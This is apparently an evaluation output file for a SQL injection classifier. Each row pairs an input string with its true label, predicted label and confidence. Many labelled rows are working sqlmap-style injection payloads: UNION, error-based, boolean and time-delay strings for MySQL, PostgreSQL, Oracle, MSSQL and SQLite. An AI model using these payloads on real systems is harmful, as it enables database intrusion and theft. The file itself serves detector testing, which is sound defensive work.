text,true_label,predicted_label,confidence_sql_injection
lonnie,0,0,0.004468253314358248
"1%' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and '%'  =  '",1,1,1.0
sirevici,0,0,0.004468253314358248
a3ui11d,0,0,0.004468253314358248
audadora,0,0,0.004468253314358248
livino,0,0,0.004468253314358248
"  select examine,coffee from short where aside = 'notice' union select triangle, nor from sets",0,0,0.0
select again ( s )  from sets left join,0,0,0.0
"1"" and   (  3020  =  3020  )  *6703",1,1,0.99
feutlins,0,0,0.004468253314358248
andrade escriba,0,0,0.004468253314358248
salv sagra,0,0,0.004468253314358248
select * from wide where upward not like '[deep]%',0,0,0.0
select * from paper where child in  ( select triangle from list ) ,0,0,0.0
" select column_name ( s )  from suggest,had",0,0,0.0
select * from fill  where meat = rock,0,0,0.0
select count ( red )  from at,0,0,0.0
casacuberta delacerda,0,0,0.004468253314358248
 (  case when 6398  =  6398 then 1 else null end  ) ,1,1,1.0
"-2178'   )    )     )   or elt  (  3421  =  2899,2899  )   and    (    (     (  'jdst'  =  'jdst",1,1,1.0
"1""  )   as ucex where 5148  =  5148 order by 1#",1,1,1.0
"select wp_posts.* from wp_posts left join wp_postmeta on  (  wp_posts.id  =  wp_postmeta.post_id and wp_postmeta.meta_key  =  'fave_agent_visible'  )  left join wp_postmeta as mt1 on  (  wp_posts.id  =  mt1.post_id  )  where 1 = 1 and wp_posts.id not in  ( 28313,28341 )  and  (  wp_postmeta.post_id is null or  (  mt1.meta_key  =  'fave_agent_visible' and cast ( mt1.meta_value as signed )  ! =  '1'  )   )  and wp_posts.post_type  =  'houzez_agent' and   (  (  wp_posts.post_status  =  'publish'  )",0,0,0.1
"select * from gas where dollar between ""giant"" and    ""graph""",0,0,0.0
select * from active fetch first 3 rows only,0,0,0.0
select industry ( s )  from policeman select world ( s ) ,0,0,0.0
select * from twelve where example = 'use'  and city = 'unless',0,0,0.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 28074 )  order by meta_id asc",0,0,0.0
"1',  (  select   (  case when   (  5249  =  9648  )   then 1 else 1/  (  select 0  )   end   )    )   ",1,1,1.0
depredador,0,0,0.004468253314358248
segovia,0,0,0.004468253314358248
select * from happy where establish between complete09/01/1996basic and within15/31/1996wish,0,0,0.0
"1'+  (  select bptu where 7356  =  7356   (  select   (  case when   (  4587  =  4587  )   then regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   else char  (  76  )  ||char  (  65  )  ||char  (  102  )  ||char  (  72  )   end  )   from   (  values  (  0   )    )      )    )   +'",1,1,1.0
"1"" where 2072  =  2072 or 7427  =  dbms_pipe.receive_message  (  chr  (  116  )  ||chr  (  87  )  ||chr  (  90  )  ||chr  (  109  )  ,5  )  --",1,1,1.0
1'+  (  select 'zjvx' where 4683  =  4683 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )     )  +',1,1,1.0
"1%""  )   and elt  (  1210  =  1210,sleep  (  5   )    )    and   (  ""%""  =  """,1,1,1.0
select * from consonant where using like '%book%',0,0,0.0
"-3074'   )    )    union all select 6131,6131,6131,6131,6131,6131,6131--",1,1,1.0
"insert into steady  ( harder, football, needs )  values  ( 'troops', 'her', 'feed' )  ",0,0,0.0
"1""   )    )     )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""oyxk""  =  ""oyxk",1,1,1.0
-4262%'   )    )     )   or 4747  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4747  =  4747  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  '%'  =  ',1,1,1.0
"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and   (  'rvwk'  =  'rvwk",1,1,1.0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  '%'  =  '",1,1,1.0
"c/ veinat de cerdanyola, 3 6e",0,0,0.0
thomson.kmit9@somagel.sk,0,0,0.004468253314358248
select wp_posts.* from wp_posts where id in  ( 367662 ) ,0,0,0.0
"1""   )    )    rlike sleep  (  5  )  #",1,1,1.0
"1'  )   as fxuk where 6184  =  6184 and make_set  (  9292  =  2785,2785  )  --",1,1,1.0
34859412z,0,0,0.004468253314358248
select   (  case when   (  9130  =  1826  )   then 9130 else 9130*  (  select 9130 from mysql.db  )   end  )  #,1,1,1.0
select written ( s from correctly right join,0,0,0.0
select stretch ( s )  from twelve select grass from aid,0,0,0.0
"1""   )    )     )   union all select null,null,null#",1,1,1.0
" select * from possibly order by concerned asc, could desc",0,0,0.0
"1""   )    )    as qgwq where 6122  =  6122",1,1,1.0
select top 50 percent * from begun select * from hang fetch first 50 percent rows onlyselect top 3 * from younger,0,0,0.0
"1"" and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )   and ""pmpk"" like ""pmpk",1,1,1.0
select * from locate where school = 'engineer' limit 3,0,0,0.0
select option_value from wp_options where option_name  =  '_houzez_property_status_3140' limit 1,0,0,0.0
"select post_id, meta_key, meta_value from wp_postmeta where post_id in  ( 4284 )  order by meta_id asc",0,0,0.0
select ascii ( customername )  as numcodeoffirstchar from customers;,0,0,0.0
"   select moment, army, silkfrom task where carried  is not null",0,0,0.0
-3211   )    )    as fsej where 6348  =  6348 or 9805  =  3783--,1,1,1.0
laguna abusaid,0,0,0.004468253314358248
heidi,0,0,0.004468253314358248
bayliss,0,0,0.004468253314358248
7219,0,0,0.004468253314358248
"insert into weight  ( remain, select, distant )  values  ( 'shut', 'create', 'tribe' )  ",0,0,0.01
"-4047'||  (  select 'rqta' from dual where 9743  =  9743 union all select 9743,9743,9743#",1,1,1.0
select determine ( s ) from excitement inner join,0,0,0.0
"-9587 union all select 1568,1568,1568,1568,1568,1568#",1,1,1.0
"1'||  (  select 'bccx' where 5881  =  5881 and elt  (  1210  =  1210,sleep  (  5   )    )     )  ||'",1,1,1.0
"-8999"" where 2821  =  2821 union all select 2821,2821,2821,2821,2821,2821,2821,2821#",1,1,1.0
select avg ( gravity ) from fence select sum ( largest ) ,0,0,0.0
"1%""   )    )    or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",1,1,1.0
5.77329e+15,0,0,0.0
tewksbur,0,0,0.004468253314358248
" select * from serious order by wrote asc, spin desc",0,0,0.0
"  select * from stood where running not in  ( 'important', 'final', 'bridge' )  ",0,0,0.0
"select count  (  *  )   from generate_series  (  1,5000000  )   and   (  'qpdu'  =  'qpdu",1,1,1.0
gabriela1,0,0,0.004468253314358248
select top 3 * from night,0,0,0.0
select * from pitch where doing between trail09/01/1996likely and point15/31/1996parts,0,0,0.0
"1'||  (  select 'dpce' from dual where 5261  =  5261 union all select null,null,null,null,null,null--",1,1,1.0
"""hi""""  )   or   (  """"a""""  =  """"a""",1,1,0.8900459290187891
"  select grow as chair, film as [fly]  from breakfast",0,0,0.0
1   )    )    as uvep where 6016  =  6016 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1,1,1.0
canute,0,0,0.004468253314358248
22533,0,0,0.004468253314358248
select top 3 * from attack where doctor = 'coat' select * from smaller,0,0,0.0
"1"" and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,1,1.0
select count ( affect ) from headed,0,0,0.0
mejury8,0,0,0.004468253314358248
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and    (    (   'boud'  =  'boud",1,1,1.0
"1'  )   where 4092  =  4092 or char  (  75  )  ||char  (  70  )  ||char  (  99  )  ||char  (  83  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,1.0
"1   )    )    or 4411  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and    (    (   3003  =  3003",1,1,1.0
"-2305' in boolean mode  )   union all select 8147,8147,8147,8147,8147,8147,8147,8147,8147,8147--",1,1,1.0
pistan robredo,0,0,0.004468253314358248
" select * from users where id  =  '1' or \.<   =  1 union select 1,@@version -- 1'",1,1,1.0
"1'   )    )    and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'rggg'  =  'rggg",1,1,1.0
tosigoso,0,0,0.004468253314358248
" select * from official order by corn asc, taken desc",0,0,0.0
select * from with where depth = 'wore'  or feel = 'red',0,0,0.0
" select column_name ( s )  from least,composed",0,0,0.0
26143,0,0,0.004468253314358248
"1   )    )     )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,1.0
select tool from coffee,0,0,0.0
6.28598e+15,0,0,0.0
"1'   )    )    as ezpq where 2976  =  2976 union all select null,null,null,null,null,null,null,null,null,null#",1,1,1.0
select * from men where calm = 'feature',0,0,0.0
"1""   )    )    and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1,1,1.0
errol@diseodesoftware.ml,0,0,0.004468253314358248
"-9318""   )    )     )   union all select 5223,5223,5223,5223#",1,1,1.0
"1 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )  # cqqs",1,1,1.0
calle virgen de la macarena 72 2-c,0,0,0.0
"select * from generate_series  (  5980,5980,case when   (  5980  =  5063  )   then 1 else 0 end  )   limit 1--",1,1,1.0
" select * from users where id  =  1 or "",;"" or 1  =  1 -- 1",1,1,1.0
"-3518  )   union all select 1877,1877,1877,1877#",1,1,1.0
select option_value from wp_options where option_name  =  'options_twitter_url' limit 1,0,0,0.0
select option_value from wp_options where option_name  =  '_transient_timeout_sm::is_connected_to_gs' limit 1,0,0,0.0
"1""  )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",1,1,1.0
apotrerar,0,0,0.004468253314358248
select column_name ( s )  from table_name,0,0,0.0
1'+  (  select 'upmd' where 3438  =  3438,1,1,1.0
-5569'  )   as cjaf where 3753  =  3753 union all select 3753#,1,1,1.0
select * from pitch order by row,0,0,0.0
demoniaca,0,0,0.004468253314358248
select avg ( history )  from famous  select sum ( figure ) ,0,0,0.0
select volume ( s )  from desk,0,0,0.0
" select * from users where id  =  1 or ""_  )  "" or 1  =  1 -- 1",1,1,1.0
guilbert_silver@maquillajeparalabios.dj,0,0,0.004468253314358248
select * from bowl where reader = 'riding' fetch first 3 rows only,0,0,0.0
"  select pony as vessels, dig as [matter]  from anyway",0,0,0.0
" end and   (  ""xksk""  =  ""xksk",1,1,1.0
princep muntadas,0,0,0.004468253314358248
select top 50 percent * from remarkable select * from ten fetch first 50 percent rows onlyselect top 3 * from those,0,0,0.0
1  )   as ozga where 4002  =  4002 and 6969  =    (  select 6969 from pg_sleep  (  5   )    )   --,1,1,1.0
46725,0,0,0.004468253314358248
select * from course where sink between '1996-07-01' and '1996-07-31',0,0,0.0
select * from ate,0,0,0.0
select * from history fetch first 50 percent rows onlyselect top 3 * from seldom,0,0,0.0
"1"" where 5353  =  5353 and exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  8190  =  8190,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )   --",1,1,1.0
select count ( * )  as practice,0,0,0.0
"1'  )   as mgko where 1828  =  1828 and make_set  (  8403  =  8403,8899  )  --",1,1,1.0
"calle goya 46, 10?g",0,0,0.0
nort$ea,0,0,0.004468253314358248
select * from finally where than like '%describe%',0,0,0.0
o1e6e2d6,0,0,0.004468253314358248
select * from earth where mysterious not between 'done' and 'donkey',0,0,0.0
9849,0,0,0.004468253314358248
"-4707' union all select 4414,4414,4414,4414,4414,4414#",1,1,1.0
select avg ( eleven )  from seed  select sum ( nodded ) ,0,0,0.0
select avg ( pour ) from choose select sum ( within ) ,0,0,0.0
"silo 179, 12?b",0,0,8.698919962957339e-05
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and 'hmqd'  =  'hmqd",1,1,1.0
"   select count ( useful ) , express from merely by tobacco",0,0,0.0
-7999  )   or 8422  =  1336,1,1,1.0
"1""  )   and sleep  (  5  )  #",1,1,1.0
"1' in boolean mode  )   union all select null,null#",1,1,1.0
"-5702'   )    )     )   union all select 7806,7806,7806,7806,7806--",1,1,1.0
colunga corrius,0,0,0.004468253314358248
villanueva gualano,0,0,0.004468253314358248
select * from settlers where prize not like '[glass]%',0,0,0.0
"insert into wool ( vapor, frog, ranch, nodded, war, angry )  values  ( 'mother', 'yourself'. thy', 'call', 'depend', 'thou', 'particles' )  ",0,0,0.0
7770,0,0,0.004468253314358248
"1'  )   as myxr where 6299  =  6299 and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  --",1,1,1.0
select weekday ( curdate (   )  )  ;,0,0,0.0
select   (  case when   (  9746  =  8055  )   then 9746 else 1/  (  select 0  )   end  )  --,1,1,1.0
"1   )    )     )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and    (    (     (  6578  =  6578",1,1,1.0
"1""  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  ""ngnd"" like ""ngnd",1,1,1.0
"   select mental, against, piefrom require where trail  is not null",0,0,0.0
select negative ( s )  from various,0,0,0.0
"1%' and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )   and '%'  =  '",1,1,1.0
"1""  )   and 2954  =  1256--",1,1,1.0
select * from operation  where lesson not like '[rule]%',0,0,0.0
1' where 9024  =  9024 rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  )  --,1,1,1.0
sandberg@3horas.tl,0,0,0.004468253314358248
"1"" or 8421  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   ",1,1,1.0
" select * from users where id  =  1 or 1#""; or 1  =  1 -- 1",1,1,0.99
"select monthname ( ""2017-06-15 09:34:21"" ) ;",0,0,0.0
"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""fqap"" like ""fqap",1,1,1.0
select television ( s )  from bill select transportation ( s ) ,0,0,0.0
1'+  (  select 'tjvt' where 2463  =  2463,1,1,1.0
"   select count ( many ) , star from truth by reach",0,0,0.0
delete from kept where want = 'softly',0,0,0.0
"1""   )    )    or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )   and    (    (   ""knbx""  =  ""knbx",1,1,1.0
"1""   )    )     )   and 4595  =  4595#",1,1,1.0
"   select count ( piece ) , but from add by main",0,0,0.0
select * from gulf where stream in  ( select flame from got ) ,0,0,0.0
select count ( tightid ) from noted,0,0,0.0
"   select busy, invented, chief from view where tool  is null",0,0,0.0
castejn de tornos,0,0,0.0
select avg ( price ) from truck,0,0,0.0
1'   )    )    and   (  7517  =  3423  )  *3423 and    (    (   'aenz'  =  'aenz,1,1,1.0
nanjar viejo,0,0,0.004468253314358248
"-9622' union all select 7208,7208,7208,7208#",1,1,1.0
select above from palace,0,0,0.0
ojinaga bascn,0,0,0.004468253314358248
"   select muscle,thought,pay,depend,replied     (  (  forty join pencil on picture.club =  worried.shelter )   inner join adjectiveon orders.every =  how.averageid ) ",0,0,0.0
" select * from lovely order by practice, ship",0,0,0.0
"1""   )    )    or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (   ""lano""  =  ""lano",1,1,1.0
"1""   )    )    rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #",1,1,1.0
"alter table zcf_zohocrmform_field_manager modify module_type varchar ( 255 ) ,modify base_model varchar ( 255 ) ,modify field_label varchar ( 255 ) ,modify field_name varchar ( 255 ) ",0,1,0.9501059740600861
intxaurraga,0,0,0.004468253314358248
1'+  (  select 'zugq' where 9218  =  9218,1,1,1.0
correccionalmente,0,0,0.004468253314358248
"1""   )    )    and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and    (    (   ""gmld"" like ""gmld",1,1,1.0
select min ( cannot )  as herd from drew,0,0,0.0
select * from  ( select leather from drive ) ,0,0,0.0
"1%'  )   or 8156  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1,1,1.0
winningt,0,0,0.004468253314358248
novallas,0,0,0.004468253314358248
select * from sight order by advice desc,0,0,0.0
1' where 5230  =  5230,1,1,1.0
"1'+  (  select 'jfir' where 7814  =  7814 and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )      )    )   +'",1,1,1.0
"1%'   )    )     )   union all select null,null,null#",1,1,1.0
"1  )   where 8691  =  8691 or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,1.0
select * from origin where bridge = 'sport',0,0,0.0
6o40o41,0,0,0.004468253314358248
"1   )    )     )   and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and    (    (     (  9462  =  9462",1,1,1.0
narita@deportechino.an,0,0,0.004468253314358248
"select pg_sleep  (  5  )   and   (  ""tpry""  =  ""tpry",1,1,0.98
select * from look where chair = 'grain'  or park = 'himself',0,0,0.0
"1""   )    )    as ecnn where 8913  =  8913 or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  --",1,1,1.0
pompa,0,0,0.004468253314358248
"-7482%""   )    )    or 1570  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  1570  =  1570  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (   ""%""  =  """,1,1,1.0
"1' or 2633  =  dbms_pipe.receive_message  (  chr  (  112  )  ||chr  (  65  )  ||chr  (  65  )  ||chr  (  103  )  ,5  )   and 'ozur'  =  'ozur",1,1,1.0
1 where 7254  =  7254,1,1,1.0
select * from swam where pencil between 'rays' and 'according',0,0,0.0
1' and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and 'napi' like 'napi,1,1,1.0
select * from attention fetch first 50 percent rows onlyselect top 3 * from hay,0,0,0.0
"-3834'   )    )     )   union all select 8313,8313--",1,1,1.0
"1""  )   as ybkp where 7788  =  7788 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",1,1,1.0
select * from essential fetch first 50 percent rows onlyselect top 3 * from horse,0,0,0.0
mike-osbourne@hiperzaragoza.qa,0,0,0.006527024015406931
"select * from forward where gravity between ""highway"" and    ""happened""",0,0,0.0
"1""   )    )     )   union all select null,null,null,null,null--",1,1,1.0
"select suppliername, contactname, address, city, postalcode, country from suppliers; insert into customers  ( customername, city, country )  ",0,0,2.49635947576451e-05
"1'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",1,1,1.0
" select count ( customerid ) , country from customers group by country  having count ( customerid )  > 5;",0,0,0.13
1'  )   or sleep  (  5  )   and   (  'kgbm'  =  'kgbm,1,1,1.0
cousinea,0,0,0.004468253314358248
"  update driven set become =  'given', city =  'whispered' where silence =  pool",0,0,0.0
24892,0,0,0.004468253314358248
"1'   )    )    as ytfi where 3323  =  3323 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1,1,1.0
8.5138e+15,0,0,0.0
select * from neighbor where green not like 'important%',0,0,0.0
vigoda5@fotoseroticas.com.ae,0,0,0.0
"-2718"" or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and ""xwbf""  =  ""xwbf",1,1,1.0
vadell comalada,0,0,0.004468253314358248
2759,0,0,0.004468253314358248
1'  )   union all select null#,1,1,0.99
"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and    (    (     (  7946  =  7946",1,1,0.99
select * from perfectly where describe = 'fairly' fetch first 3 rows only,0,0,0.0
18121520g,0,0,0.004468253314358248
37219,0,0,0.004468253314358248
"-5597'  )   or make_set  (  2490  =  2164,2164  )  ",1,1,0.99
select * from soil where among like '%join%',0,0,0.0
select * from wp_posts where id  =  367808 limit 1,0,0,0.0
"1%'   )    )     )   and char  (  120  )  ||char  (  106  )  ||char  (  117  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  9981  )  ,0  )  ,5000000000  )  ,null  )   and    (    (     (  '%'  =  '",1,1,1.0
"-7248'  )   where 4626  =  4626 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",1,1,1.0
select * from sold order by hot,0,0,0.0
"1""   )    )    procedure analyse  (  extractvalue  (  9627,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x4b774c75   )    )      )    )     )  ,1  )  #",1,1,1.0
select top 50 percent * from somewhere,0,0,0.0
select not ( s )  from greatest union,0,0,0.0
"1 or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  ",1,1,1.0
"quinita flores 75,",0,0,0.0012045813123877282
baumgarten bagudanc,0,0,0.004468253314358248
aliaguilla,0,0,0.004468253314358248
select * from  ( select youth from few ) ,0,0,0.0
select whale ( s )  from join left join,0,0,0.0
select * from perfectly where canal = 'sum'  and city = 'belt',0,0,0.0
"1%' and 4241  =  convert  (  int,  (  select char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  4241  =  4241  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and '%'  =  '",1,1,1.0
"-1791' union all select 9316,9316,9316,9316,9316,9316,9316,9316--",1,1,1.0
c09so18,0,0,0.004468253314358248
qui0g6n16si2o,0,0,0.004468253314358248
sugesto,0,0,0.004468253314358248
select * from nation where job = 'roll' limit 3,0,0,0.0
select top 3 * from airplane where president = 'hollow' select * from tube,0,0,0.0
wolbert.navin@cirugiaalbeiteria.nu,0,0,0.004468253314358248
"  select grandfatherid as id, friend as edge from fact",0,0,0.0
" select * from putting order by thought, nice",0,0,0.0
select in ( s )  from missing select deer from written,0,0,0.05
select * from truck where chair = 'maybe',0,0,0.0
"1'   )    )    and   (  select 2*  (  if   (    (   select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  3484  =  3484,1   )    )     )  ,0x717a767a71,0x78   )    )   s  )  , 8446744073709551610, 8446744073709551610   )    )     )   and    (    (   'yzdp'  =  'yzdp",1,1,1.0
select distinct chicken from traffic,0,0,0.0
select top 50 percent * from yesterday,0,0,0.0
"  select orders.keyrid, employees.smile, employees.managed from ordersright join employees on orders.employeeid  =  employees.bridgeid order by orders.airplaneid",0,0,0.0
1  )   rlike   (  select   (  case when   (  7689  =  7689  )   then 1 else 0x28 end   )    ) ,1,1,0.99
select count ( distinct national )  from good,0,0,0.0
5.9335e+15,0,0,0.0
"1'  )   where 6248  =  6248 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1,1,1.0
"-8106%""  )   union all select 2051,2051,2051,2051,2051,2051#",1,1,1.0
"  select * from garage where exactly in  ( 'above', 'shut', 'becoming' )  ",0,0,0.0
"1%"" union all select null,null,null,null,null,null,null,null#",1,1,1.0
"  select * from sharp where bigger not in  ( 'since', 'likely', 'through' )  ",0,0,0.0
select * from troops fetch first 50 percent rows only,0,0,0.0
 or 0  =  0 #,1,1,0.9308333333333334
select avg ( price ) from until,0,0,0.0
1'  )   where 5280  =  5280 and 4595  =  4595#,1,1,1.0
delete from push,0,0,0.0
select avg ( price ) from recognize,0,0,0.0
select * from most,0,0,0.0
38470,0,0,0.004468253314358248
select * from believed where impossible = 'pictured'  and city = 'fair',0,0,0.0
"-7041""   )    )     )   union all select 2159,2159,2159,2159,2159--",1,1,1.0
72484997z,0,0,0.004468253314358248
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ""fkdx"" like ""fkdx",1,1,1.0
select go ( s )  from remarkable,0,0,0.0
ars yermo,0,0,0.004468253314358248
"1' in boolean mode  )   or char  (  68  )  ||char  (  69  )  ||char  (  97  )  ||char  (  85  )    =  regexp_substring  (  repeat  (  right  (  char  (  5389  )  ,0  )  ,5000000000  )  ,null  )  #",1,1,1.0
" select * from users where id  =  '1' ||1 union select 1,banner from v$version where rownum  =  1 -- 1'",1,1,1.0
"1""   )    )    and make_set  (  8403  =  8403,8899  )   and    (    (   ""ieuj"" like ""ieuj",1,1,1.0
1 where 8506  =  8506,1,1,1.0
-8131'   )    )    or 9680  =  3467,1,1,1.0
select peace ( s )  from aware union all,0,0,0.0
select every from directly union all select merely from indeed order by furniture,0,0,0.0
giuliani casabella,0,0,0.004468253314358248
